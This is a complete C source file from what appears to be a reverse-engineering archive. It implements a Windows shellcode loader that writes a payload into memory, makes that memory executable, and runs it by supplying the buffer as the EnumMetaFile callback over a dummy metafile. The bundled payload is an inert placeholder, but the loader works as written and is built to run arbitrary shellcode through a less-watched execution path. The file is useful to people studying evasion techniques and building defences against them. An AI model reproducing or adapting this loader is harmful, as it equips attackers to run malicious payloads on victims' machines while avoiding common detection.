/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

    This will create minimalist .wmf file before executing payload

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  EnumMetaFile
*/

#include <windows.h>
#include <stdint.h>

#define DUMMY_WMF "dummy.wmf"

#pragma comment(lib,"gdi32")

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    HMETAFILE hmf;
    HDC hdc;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        // tactic 1: create metafile with simple drawing and then use to trigger
        hdc = CreateMetaFile(DUMMY_WMF);
        Rectangle(hdc, 10, 10, 100, 100);
        hmf = CloseMetaFile(hdc);

        // tactic 2: load existing metafile and then use it to trigger
        /*
        hmf = GetMetaFile(DUMMY_WMF);
        hdc = CreateCompatibleDC(NULL); 
        */

        // execute payload
        EnumMetaFile(hdc, hmf, (MFENUMPROC)runtime, NULL);

        // cleanup
        DeleteDC(hdc);
        DeleteMetaFile(hmf);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}